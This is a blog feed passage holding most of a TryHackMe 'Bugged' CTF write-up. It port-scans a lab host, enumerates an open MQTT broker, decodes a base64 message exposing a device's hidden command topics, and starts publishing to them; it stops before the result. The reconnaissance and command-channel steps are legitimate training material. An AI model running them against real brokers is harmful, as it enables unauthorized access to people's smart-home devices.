<li id="2076" class="xw xx tu ly b xy acm ya yb yc acn ye yf abu aco yh yi abv acp yk yl abw acq yn yo yp acj ack acl bj" data-selectable-paragraph=""><a class="af rn" href="https://0xpatrik.com/subdomain-takeover-ns/" rel="noopener ugc nofollow" target="_blank">https://0xpatrik.com/subdomain-takeover-ns/</a></li>
</ul>
<p id="d210" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph=""><strong class="ly kz">Thanks for Reading!!</strong></p>
<p id="caaa" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph=""><strong class="ly kz">Follow me on Twitter</strong>: <a class="af rn" href="https://twitter.com/sakibulalikhan" rel="noopener ugc nofollow" target="_blank">https://twitter.com/sakibulalikhan</a></p>
<p id="a415" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph=""><strong class="ly kz">Happy Takeover ~</strong></p>
            ]]>
        </content>
    </entry>
    <entry>
        <title>Bugged Tryhackme CTF Writeup</title>
        <author>
            <name>Sakibul Ali Khan</name>
        </author>
        <link href="https://sakibulalikhan.pages.dev/bugged-tryhackme-ctf-writeup.html"/>
        <id>https://sakibulalikhan.pages.dev/bugged-tryhackme-ctf-writeup.html</id>
        <media:content url="https://sakibulalikhan.pages.dev/media/posts/5/Bugged-Tryhackme-CTF-Writeup.jpg" medium="image" />
            <category term="TryHackMe"/>
            <category term="Pentesting"/>
            <category term="IoT Security"/>
            <category term="IoT"/>
            <category term="CTF Writeups"/>

        <updated>2024-01-07T10:40:33+06:00</updated>
            <summary>
                <![CDATA[
                        <img src="https://sakibulalikhan.pages.dev/media/posts/5/Bugged-Tryhackme-CTF-Writeup.jpg" alt="Bugged Tryhackme CTF Writeup" />
                    John was working on his smart home appliances when he noticed weird traffic going across the network. Can you help him figure out what these weird&hellip;
                ]]>
            </summary>
        <content type="html">
            <![CDATA[
                    <p><img src="https://sakibulalikhan.pages.dev/media/posts/5/Bugged-Tryhackme-CTF-Writeup.jpg" class="type:primaryImage" alt="Bugged Tryhackme CTF Writeup" /></p>
                <div class="post__entry">
<p id="ee57" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph=""><strong class="ly kz">John</strong> was working on his smart home appliances when he noticed weird traffic going across the network. Can you help him figure out what these weird network communications are?</p>
<p id="a92b" class="zn zf tu be zg zo zp zq ld zr zs zt lh zu zv zw zx zy zz aba abb abc abd abe abf abg bj"><strong>Difficulty =</strong> Easy</p>
<p id="c5ce" class="pw-post-body-paragraph xw xx tu ly b xy abh ya yb yc abi ye yf li abj yh yi ln abk yk yl ls abl yn yo yp fp bj" data-selectable-paragraph=""><strong class="ly kz">Challenges:</strong><span class="ly kz"> Network Analyze, IoT Hacking.</span></p>
<p id="f868" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Beginning start with Rustscan. For scan, we use ‘-a’ flag to specify our target. And we also use ‘-r’ flag to set port ranges.</p>
<pre class="yq yr ys yt yu abx abp anr bo ans ba bj"><span id="dc46" class="ant zf tu abp b bf anu anv l anw acd" data-selectable-paragraph="">sak@kali~ rustscan -a <span class="hljs-number">10.10</span>.<span class="hljs-number">232.80</span> -r <span class="hljs-number">1</span>-<span class="hljs-number">5000</span><br>.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.<br>| {}  }| { } |{ {_<span class="hljs-number">_</span> {<span class="hljs-number">_</span>   <span class="hljs-number">_</span>}{ {_<span class="hljs-number">_</span>  /  __<span class="hljs-number">_</span>} / {} \ |  <span class="hljs-string">`| |<br>| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |<br>`</span>-<span class="hljs-string">' `-'</span><span class="hljs-string">`-----'`</span>----<span class="hljs-string">'  `-'</span>  <span class="hljs-string">`----'  `</span>---<span class="hljs-string">' `-'</span>  <span class="hljs-string">`-'`</span>-<span class="hljs-string">' `-'</span><br>The Modern Day Port Scanner.<br>_______________________________________<span class="hljs-number">_</span><br>: https:<span class="hljs-regexp">//gi</span>thub.com/RustScan/RustScan :<br> --------------------------------------<br>🌍HACK THE PLANET🌍<br><br>[~] The config file is expected to be at <span class="hljs-string">"/home/sak/.rustscan.toml"</span><br>[~] File limit higher than batch size. Can increase speed by increasing batch size <span class="hljs-string">'-b 1073741716'</span>.<br>Open <span class="hljs-number">10.10</span>.<span class="hljs-number">232.80</span>:<span class="hljs-number">1883</span><br>[~] Starting Script(s)<br>[&gt;] Script to be run Some(<span class="hljs-string">"nmap -vvv -p {{port}} {{ip}}"</span>)<br><br>[~] Starting Nmap <span class="hljs-number">7.93</span> ( https:<span class="hljs-regexp">//nmap</span>.org ) at <span class="hljs-number">2023</span>-<span class="hljs-number">03</span>-<span class="hljs-number">05</span> <span class="hljs-number">12</span>:<span class="hljs-number">52</span> +<span class="hljs-number">06</span><br>Initiating Ping Scan at <span class="hljs-number">12</span>:<span class="hljs-number">52</span><br>Scanning <span class="hljs-number">10.10</span>.<span class="hljs-number">232.80</span> [<span class="hljs-number">2</span> ports]<br>Completed Ping Scan at <span class="hljs-number">12</span>:<span class="hljs-number">52</span>, <span class="hljs-number">0</span>.<span class="hljs-number">24</span>s elapsed (<span class="hljs-number">1</span> total hosts)<br>Initiating Parallel DNS resolution of <span class="hljs-number">1</span> host. at <span class="hljs-number">12</span>:<span class="hljs-number">52</span><br>Completed Parallel DNS resolution of <span class="hljs-number">1</span> host. at <span class="hljs-number">12</span>:<span class="hljs-number">52</span>, <span class="hljs-number">0</span>.<span class="hljs-number">30</span>s elapsed<br>DNS resolution of <span class="hljs-number">1</span> IPs took <span class="hljs-number">0</span>.<span class="hljs-number">30</span>s. Mode: Async [<span class="hljs-comment">#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]</span><br>Initiating Connect Scan at <span class="hljs-number">12</span>:<span class="hljs-number">52</span><br>Scanning <span class="hljs-number">10.10</span>.<span class="hljs-number">232.80</span> [<span class="hljs-number">1</span> port]<br>Discovered <span class="hljs-keyword">open</span> port <span class="hljs-number">1883</span>/tcp on <span class="hljs-number">10.10</span>.<span class="hljs-number">232.80</span><br>Completed Connect Scan at <span class="hljs-number">12</span>:<span class="hljs-number">52</span>, <span class="hljs-number">0</span>.<span class="hljs-number">25</span>s elapsed (<span class="hljs-number">1</span> total ports)<br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">232.80</span><br>Host is up, received conn-refused (<span class="hljs-number">0</span>.<span class="hljs-number">25</span>s latency).<br>Scanned at <span class="hljs-number">2023</span>-<span class="hljs-number">03</span>-<span class="hljs-number">05</span> <span class="hljs-number">12</span>:<span class="hljs-number">52</span>:<span class="hljs-number">49</span> +<span class="hljs-number">06</span> <span class="hljs-keyword">for</span> <span class="hljs-number">1</span>s<br><br>PORT     STATE SERVICE REASON<br><span class="hljs-number">1883</span>/tcp <span class="hljs-keyword">open</span>  mqtt    syn-ack</span></pre>
<p id="d3fd" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">It looks like there is 1 a service running. In target machine service ‘MQTT’ is running on TCP port ‘1883’.</p>
<h2 id="2f82" class="zn zf tu be zg zo zp zq ld zr zs zt lh zu zv zw zx zy zz aba abb abc abd abe abf abg bj">Basic Information About ‘MQTT’</h2>
<p id="dc0e" class="pw-post-body-paragraph xw xx tu ly b xy abh ya yb yc abi ye yf li abj yh yi ln abk yk yl ls abl yn yo yp fp bj" data-selectable-paragraph="">MQTT stands for MQ Telemetry Transport. It is a publish/subscribe, <strong class="ly kz">extremely simple, and lightweight messaging protocol</strong>, designed for constrained devices and low-bandwidth, high-latency, or unreliable networks. The design principles are to minimize network bandwidth and device resource requirements whilst also attempting to ensure reliability and some degree of assurance of delivery. These principles also turn out to make the protocol ideal for the emerging “machine-to-machine” (M2M) or “Internet of Things” world of connected devices, and for mobile applications where bandwidth and battery power are at a premium.</p>
<p id="253d" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph=""><strong class="ly kz">Default port:</strong> 1883</p>
<figure class="yq yr ys yt yu yv kl km paragraph-image">
<div class="kl km aoc">
<figure class="bg yx yy c"><figure class="is-loaded"><img  src="https://miro.medium.com/v2/resize:fit:663/0*_zH7lb_3H1yrrcAU.png" alt="Bugged Tryhackme CTF Writeup" width="663" height="534" loading="lazy" data-is-external-image="true" data-is-external-image="true"></figure></figure>
</div>
<figcaption class="yz za zb kl km zc zd be b bf z dl" data-selectable-paragraph="">Basic Information About ‘MQTT’</figcaption>
</figure>
<p id="51f5" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Now our second step began here. At this moment we start the Nmap scan to know more about the service that is running on the server.</p>
<p id="3d37" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">For Nmap scan, we use ‘-sV’ flag to know about services &amp; versions. And we use ‘-sC’ flag to default script scan. We also use ‘-p’ flag to specify which port we want to scan.</p>
<pre class="yq yr ys yt yu abx abp anr bo ans ba bj"><span id="ecef" class="ant zf tu abp b bf anu anv l anw acd" data-selectable-paragraph=""> sak@kali~ sudo nmap -sV -sC -p 1883 10.10.232.80<br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-05 13:08 +06<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.232.80<br>Host is up (0.25s latency).<br><br>PORT     STATE SERVICE                  VERSION<br>1883/tcp open  mosquitto version 2.0.14<br>| mqtt-subscribe: <br>|   Topics and their most recent payloads: <br>|     <span class="hljs-variable">$SYS</span>/broker/load/bytes/received/1min: 4410.65<br>|     <span class="hljs-variable">$SYS</span>/broker/load/publish/sent/5min: 4.71<br>|     <span class="hljs-variable">$SYS</span>/broker/load/messages/sent/15min: 85.18<br>|     <span class="hljs-variable">$SYS</span>/broker/clients/connected: 2<br>|     <span class="hljs-variable">$SYS</span>/broker/load/connections/5min: 0.39<br>|     livingroom/speaker: {<span class="hljs-string">"id"</span>:15127941740320722645,<span class="hljs-string">"gain"</span>:46}<br>|     <span class="hljs-variable">$SYS</span>/broker/messages/sent: 3575<br>|     <span class="hljs-variable">$SYS</span>/broker/load/sockets/15min: 0.22<br>|     <span class="hljs-variable">$SYS</span>/broker/store/messages/count: 34<br>|     <span class="hljs-variable">$SYS</span>/broker/messages/stored: 34<br>|     <span class="hljs-variable">$SYS</span>/broker/publish/messages/sent: 52<br>|     <span class="hljs-variable">$SYS</span>/broker/clients/active: 2<br>|     <span class="hljs-variable">$SYS</span>/broker/subscriptions/count: 3<br>|     <span class="hljs-variable">$SYS</span>/broker/store/messages/bytes: 369<br>|     <span class="hljs-variable">$SYS</span>/broker/publish/bytes/received: 119484<br>|     storage/thermostat: {<span class="hljs-string">"id"</span>:14536458125521088285,<span class="hljs-string">"temperature"</span>:23.189959}<br>|     patio/lights: {<span class="hljs-string">"id"</span>:8415478818146317759,<span class="hljs-string">"color"</span>:<span class="hljs-string">"WHITE"</span>,<span class="hljs-string">"status"</span>:<span class="hljs-string">"OFF"</span>}<br>|     kitchen/toaster: {<span class="hljs-string">"id"</span>:9223877754878364611,<span class="hljs-string">"in_use"</span>:<span class="hljs-literal">true</span>,<span class="hljs-string">"temperature"</span>:156.5998,<span class="hljs-string">"toast_time"</span>:210}<br>|     <span class="hljs-variable">$SYS</span>/broker/version: mosquitto version 2.0.14<br>|     <span class="hljs-variable">$SYS</span>/broker/bytes/received: 167321<br>|     frontdeck/camera: {<span class="hljs-string">"id"</span>:5624806846270235642,<span class="hljs-string">"yaxis"</span>:143.5409,<span class="hljs-string">"xaxis"</span>:-37.70204,<span class="hljs-string">"zoom"</span>:4.5788803,<span class="hljs-string">"movement"</span>:<span class="hljs-literal">false</span>}<br>|     <span class="hljs-variable">$SYS</span>/broker/clients/maximum: 2<br>|     <span class="hljs-variable">$SYS</span>/broker/messages/received: 3524<br>|     <span class="hljs-variable">$SYS</span>/broker/load/bytes/received/15min: 3970.90<br>|     <span class="hljs-variable">$SYS</span>/broker/retained messages/count: 36<br>|     <span class="hljs-variable">$SYS</span>/broker/load/bytes/received/5min: 4291.50<br>|     <span class="hljs-variable">$SYS</span>/broker/publish/bytes/sent: 291<br>|     <span class="hljs-variable">$SYS</span>/broker/load/publish/sent/1min: 21.93<br>|     <span class="hljs-variable">$SYS</span>/broker/load/sockets/1min: 1.83<br>|     <span class="hljs-variable">$SYS</span>/broker/load/connections/15min: 0.14<br>|     <span class="hljs-variable">$SYS</span>/broker/load/connections/1min: 1.83<br>|     <span class="hljs-variable">$SYS</span>/broker/uptime: 2343 seconds<br>|     <span class="hljs-variable">$SYS</span>/broker/load/sockets/5min: 0.42<br>|     <span class="hljs-variable">$SYS</span>/broker/load/messages/sent/5min: 95.12<br>|     <span class="hljs-variable">$SYS</span>/broker/load/messages/sent/1min: 113.75<br>|     <span class="hljs-variable">$SYS</span>/broker/load/messages/received/5min: 90.41<br>|     <span class="hljs-variable">$SYS</span>/broker/load/messages/received/1min: 91.82<br>|     <span class="hljs-variable">$SYS</span>/broker/load/publish/sent/15min: 1.59<br>|     <span class="hljs-variable">$SYS</span>/broker/load/messages/received/15min: 83.59<br>|     <span class="hljs-variable">$SYS</span>/broker/load/bytes/sent/5min: 552.51<br>|     <span class="hljs-variable">$SYS</span>/broker/load/bytes/sent/15min: 398.79<br>|     <span class="hljs-variable">$SYS</span>/broker/load/bytes/sent/1min: 1255.39<br>|     <span class="hljs-variable">$SYS</span>/broker/clients/total: 2<br>|_    <span class="hljs-variable">$SYS</span>/broker/bytes/sent: 16314<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 14.10 seconds</span></pre>
<p id="8551" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">For ferther scan we use ‘mosquitto’ tool. If your device does have not this tool you can install it by this simple command.</p>
<pre class="yq yr ys yt yu abx abp anr bo ans ba bj"><span id="d4fc" class="ant zf tu abp b bf anu anv l anw acd" data-selectable-paragraph="">sudo apt-<span class="hljs-keyword">get</span> install mosquitto mosquitto-clients -y</span></pre>
<p id="a423" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Now we use “mosquitto_sub” and use ‘-t’ flag to specifying the topic and also use ‘-h’ flag to specify the host address. If we give any topic in in ‘-t’ flag then we’ll get information about that topic. But here we want information about all topics. So, on ‘-t’ flag we use the wildcard “#” for this operation.</p>
<pre class="yq yr ys yt yu abx abp anr bo ans ba bj"><span id="7f11" class="ant zf tu abp b bf anu anv l anw acd" data-selectable-paragraph="">sak<span class="hljs-variable">@kali</span>~ mosquitto_sub -t <span class="hljs-string">"#"</span> -h <span class="hljs-number">10.10</span>.<span class="hljs-number">232.80</span><br>{<span class="hljs-string">"id"</span><span class="hljs-symbol">:</span><span class="hljs-number">6303134845423256684</span>,<span class="hljs-string">"gain"</span><span class="hljs-symbol">:</span><span class="hljs-number">45</span>}<br>{<span class="hljs-string">"id"</span><span class="hljs-symbol">:</span><span class="hljs-number">7062282878224178102</span>,<span class="hljs-string">"color"</span><span class="hljs-symbol">:<span class="hljs-string">"GREEN"</span></span>,<span class="hljs-string">"status"</span><span class="hljs-symbol">:<span class="hljs-string">"ON"</span></span>}<br>{<span class="hljs-string">"id"</span><span class="hljs-symbol">:</span><span class="hljs-number">5297822194260674402</span>,<span class="hljs-string">"temperature"</span><span class="hljs-symbol">:</span><span class="hljs-number">24.360235</span>}<br>{<span class="hljs-string">"id"</span><span class="hljs-symbol">:</span><span class="hljs-number">2860013371319219134</span>,<span class="hljs-string">"temperature"</span><span class="hljs-symbol">:</span><span class="hljs-number">24.233936</span>}<br>{<span class="hljs-string">"id"</span><span class="hljs-symbol">:</span><span class="hljs-number">5845551519049790310</span>,<span class="hljs-string">"gain"</span><span class="hljs-symbol">:</span><span class="hljs-number">61</span>}<br>{<span class="hljs-string">"id"</span><span class="hljs-symbol">:</span><span class="hljs-number">14786151255640681934</span>,<span class="hljs-string">"color"</span><span class="hljs-symbol">:<span class="hljs-string">"RED"</span></span>,<span class="hljs-string">"status"</span><span class="hljs-symbol">:<span class="hljs-string">"OFF"</span></span>}<br>{<span class="hljs-string">"id"</span><span class="hljs-symbol">:</span><span class="hljs-number">11637714936854629483</span>,<span class="hljs-string">"in_use"</span><span class="hljs-symbol">:false</span>,<span class="hljs-string">"temperature"</span><span class="hljs-symbol">:</span><span class="hljs-number">158.6413</span>,<span class="hljs-string">"toast_time"</span><span class="hljs-symbol">:</span><span class="hljs-number">207</span>}<br>{<span class="hljs-string">"id"</span><span class="hljs-symbol">:</span><span class="hljs-number">12972826565605654962</span>,<span class="hljs-string">"temperature"</span><span class="hljs-symbol">:</span><span class="hljs-number">23.58</span>}<br>{<span class="hljs-string">"id"</span><span class="hljs-symbol">:</span><span class="hljs-number">5464270745344776246</span>,<span class="hljs-string">"yaxis"</span><span class="hljs-symbol">:</span><span class="hljs-number">88.01166</span>,<span class="hljs-string">"xaxis"</span><span class="hljs-symbol">:-</span><span class="hljs-number">120.650795</span>,<span class="hljs-string">"zoom"</span><span class="hljs-symbol">:</span><span class="hljs-number">3.0464551</span>,<span class="hljs-string">"movement"</span><span class="hljs-symbol">:false</span>}<br>{<span class="hljs-string">"id"</span><span class="hljs-symbol">:</span><span class="hljs-number">3711207335622492878</span>,<span class="hljs-string">"gain"</span><span class="hljs-symbol">:</span><span class="hljs-number">55</span>}<br>{<span class="hljs-string">"id"</span><span class="hljs-symbol">:</span><span class="hljs-number">7536635942787451007</span>,<span class="hljs-string">"color"</span><span class="hljs-symbol">:<span class="hljs-string">"GREEN"</span></span>,<span class="hljs-string">"status"</span><span class="hljs-symbol">:<span class="hljs-string">"OFF"</span></span>}<br>{<span class="hljs-string">"id"</span><span class="hljs-symbol">:</span><span class="hljs-number">14890795244202004796</span>,<span class="hljs-string">"temperature"</span><span class="hljs-symbol">:</span><span class="hljs-number">23.076757</span>}<br>{<span class="hljs-string">"id"</span><span class="hljs-symbol">:</span><span class="hljs-number">2458810731003226774</span>,<span class="hljs-string">"in_use"</span><span class="hljs-symbol">:true</span>,<span class="hljs-string">"temperature"</span><span class="hljs-symbol">:</span><span class="hljs-number">144.60513</span>,<span class="hljs-string">"toast_time"</span><span class="hljs-symbol">:</span><span class="hljs-number">251</span>}<br>{<span class="hljs-string">"id"</span><span class="hljs-symbol">:</span><span class="hljs-number">9928724913760140067</span>,<span class="hljs-string">"gain"</span><span class="hljs-symbol">:</span><span class="hljs-number">73</span>}<br>{<span class="hljs-string">"id"</span><span class="hljs-symbol">:</span><span class="hljs-number">6498368860634934991</span>,<span class="hljs-string">"temperature"</span><span class="hljs-symbol">:</span><span class="hljs-number">24.349384</span>}<br>{<span class="hljs-string">"id"</span><span class="hljs-symbol">:</span><span class="hljs-number">3598942894745952976</span>,<span class="hljs-string">"color"</span><span class="hljs-symbol">:<span class="hljs-string">"RED"</span></span>,<span class="hljs-string">"status"</span><span class="hljs-symbol">:<span class="hljs-string">"ON"</span></span>}<br>{<span class="hljs-string">"id"</span><span class="hljs-symbol">:</span><span class="hljs-number">12888160293013420529</span>,<span class="hljs-string">"yaxis"</span><span class="hljs-symbol">:</span><span class="hljs-number">124.13611</span>,<span class="hljs-string">"xaxis"</span><span class="hljs-symbol">:</span><span class="hljs-number">175.50891</span>,<span class="hljs-string">"zoom"</span><span class="hljs-symbol">:</span><span class="hljs-number">0.9612895</span>,<span class="hljs-string">"movement"</span><span class="hljs-symbol">:true</span>}<br>{<span class="hljs-string">"id"</span><span class="hljs-symbol">:</span><span class="hljs-number">7852150045648343267</span>,<span class="hljs-string">"in_use"</span><span class="hljs-symbol">:false</span>,<span class="hljs-string">"temperature"</span><span class="hljs-symbol">:</span><span class="hljs-number">153.8073</span>,<span class="hljs-string">"toast_time"</span><span class="hljs-symbol">:</span><span class="hljs-number">121</span>}<br>{<span class="hljs-string">"id"</span><span class="hljs-symbol">:</span><span class="hljs-number">17285335294252743187</span>,<span class="hljs-string">"gain"</span><span class="hljs-symbol">:</span><span class="hljs-number">54</span>}<br>{<span class="hljs-string">"id"</span><span class="hljs-symbol">:</span><span class="hljs-number">11505589973457021977</span>,<span class="hljs-string">"temperature"</span><span class="hljs-symbol">:</span><span class="hljs-number">23.719482</span>}<br>eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlZ2lzdGVyZWRfY29tbWFuZHMiOlsiSEVMUCIsIkNNRCIsIlNZUyJdLCJwdWJfdG9waWMiOiJVNHZ5cU5sUXRmLzB2b3ptYVp5TFQvMTVIOVRGNkNIZy9wdWIiLCJzdWJfdG9waWMiOiJYRDJyZlI5QmV6L0dxTXBSU0VvYmgvVHZMUWVoTWcwRS9zdWIifQ==<br>{<span class="hljs-string">"id"</span><span class="hljs-symbol">:</span><span class="hljs-number">16076301308523402932</span>,<span class="hljs-string">"color"</span><span class="hljs-symbol">:<span class="hljs-string">"RED"</span></span>,<span class="hljs-string">"status"</span><span class="hljs-symbol">:<span class="hljs-string">"ON"</span></span>}<br>{<span class="hljs-string">"id"</span><span class="hljs-symbol">:</span><span class="hljs-number">7411803660708968315</span>,<span class="hljs-string">"gain"</span><span class="hljs-symbol">:</span><span class="hljs-number">60</span>}<br>{<span class="hljs-string">"id"</span><span class="hljs-symbol">:</span><span class="hljs-number">18348470723758418035</span>,<span class="hljs-string">"temperature"</span><span class="hljs-symbol">:</span><span class="hljs-number">23.625862</span>}<br>{<span class="hljs-string">"id"</span><span class="hljs-symbol">:</span><span class="hljs-number">12464564460746554731</span>,<span class="hljs-string">"in_use"</span><span class="hljs-symbol">:true</span>,<span class="hljs-string">"temperature"</span><span class="hljs-symbol">:</span><span class="hljs-number">150.03351</span>,<span class="hljs-string">"toast_time"</span><span class="hljs-symbol">:</span><span class="hljs-number">297</span>}<br>{<span class="hljs-string">"id"</span><span class="hljs-symbol">:</span><span class="hljs-number">652803559971738546</span>,<span class="hljs-string">"color"</span><span class="hljs-symbol">:<span class="hljs-string">"GREEN"</span></span>,<span class="hljs-string">"status"</span><span class="hljs-symbol">:<span class="hljs-string">"ON"</span></span>}<br>{<span class="hljs-string">"id"</span><span class="hljs-symbol">:</span><span class="hljs-number">6540437519393488331</span>,<span class="hljs-string">"temperature"</span><span class="hljs-symbol">:</span><span class="hljs-number">23.25789</span>}<br>{<span class="hljs-string">"id"</span><span class="hljs-symbol">:</span><span class="hljs-number">5951090730247747994</span>,<span class="hljs-string">"yaxis"</span><span class="hljs-symbol">:</span><span class="hljs-number">76.82907</span>,<span class="hljs-string">"xaxis"</span><span class="hljs-symbol">:-</span><span class="hljs-number">96.71407</span>,<span class="hljs-string">"zoom"</span><span class="hljs-symbol">:</span><span class="hljs-number">1.7843343</span>,<span class="hljs-string">"movement"</span><span class="hljs-symbol">:false</span>}<br>{<span class="hljs-string">"id"</span><span class="hljs-symbol">:</span><span class="hljs-number">12233324324560130586</span>,<span class="hljs-string">"gain"</span><span class="hljs-symbol">:</span><span class="hljs-number">49</span>}</span></pre>
<p id="80a3" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">In this operation we got something interesting thing:</p>
<pre id="4662" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj">“eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlZ2lzdGVyZWRfY29tbWFuZHMiOlsiSEVMUCIsIkNNRCIsIlNZUyJdLCJwdWJfdG9waWMiOiJVNHZ5cU5sUXRmLzB2b3ptYVp5TFQvMTVIOVRGNkNIZy9wdWIiLCJzdWJfdG9waWMiOiJYRDJyZlI5QmV6L0dxTXBSU0VvYmgvVHZMUWVoTWcwRS9zdWIifQ==”</pre>
<p id="66fc" class="xw xx abt ly b xy xz ya yb yc yd ye yf abu yg yh yi abv yj yk yl abw ym yn yo yp fp bj" data-selectable-paragraph="">They asked us, “Can you help him figure out what these weird network communications are?” Yes, got something weird on network communications.</p>
<p id="fedf" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">This is base64 encoded. So, let’s decode this and see what we got.</p>
<pre class="yq yr ys yt yu abx abp anr bo ans ba bj"><span id="74ce" class="ant zf tu abp b bf anu anv l anw acd" data-selectable-paragraph=""> sak@kali ~ <span class="hljs-built_in">echo</span> <span class="hljs-string">"eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlZ2lzdGVyZWRfY29tbWFuZHMiOlsiSEVMUCIsIkNNRCIsIlNZUyJdLCJwdWJfdG9waWMiOiJVNHZ5cU5sUXRmLzB2b3ptYVp5TFQvMTVIOVRGNkNIZy9wdWIiLCJzdWJfdG9waWMiOiJYRDJyZlI5QmV6L0dxTXBSU0VvYmgvVHZMUWVoTWcwRS9zdWIifQ=="</span> | <span class="hljs-built_in">base64</span> -d<br><br>{<span class="hljs-string">"id"</span>:<span class="hljs-string">"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d"</span>,<span class="hljs-string">"registered_commands"</span>:[<span class="hljs-string">"HELP"</span>,<span class="hljs-string">"CMD"</span>,<span class="hljs-string">"SYS"</span>],<span class="hljs-string">"pub_topic"</span>:<span class="hljs-string">"U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub"</span>,<span class="hljs-string">"sub_topic"</span>:<span class="hljs-string">"XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub"</span>}%  </span></pre>
<p id="3a0f" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">After decoding there is registered_command and publiser_topic also subscriber_topic.</p>
<p id="75c6" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">In this MQTT model publisher always publish data and the subscriber always receives data but the subscriber can’t tell the publisher or IoT device what to do or what to publish (cause it is precoded). So, there might be a security vulnerability. We have to find out :)</p>
<p id="6e63" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">In decoded section, this publisher topic “U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub” is registered with the commands “HELP”,”CMD”,”SYS”. Let’s check What can do with this stuff.</p>
<p id="297d" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Now we try to receive data from the publisher. So, We have to start our subscribers. For that use this command.</p>
<pre class="yq yr ys yt yu abx abp anr bo ans ba bj"><span id="0853" class="ant zf tu abp b bf anu anv l anw acd" data-selectable-paragraph="">sak<span class="hljs-keyword">@kali</span> ~ mosquitto_sub -t <span class="hljs-string">"U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub"</span> -h <span class="hljs-number">10.10</span>.<span class="hljs-number">20.204</span></span></pre>
<p id="e29d" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Now we going to simulate the IoT device. For that, we use subscriber id “XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub‘ and send a message to the subscriber.</p>
<pre class="yq yr ys yt yu abx abp anr bo ans ba bj"><span id="89e0" class="ant zf tu abp b bf anu anv l anw acd" data-selectable-paragraph="">mosquitto_pub -t <span class="hljs-string">"XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub"</span> -m <span class="hljs-string">"simple_massage"</span> -h 10.10.20.204</span></pre>
<p id="2817" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">In here ‘-m’ flag for our massage. Let’s check what subscribers got.</p>
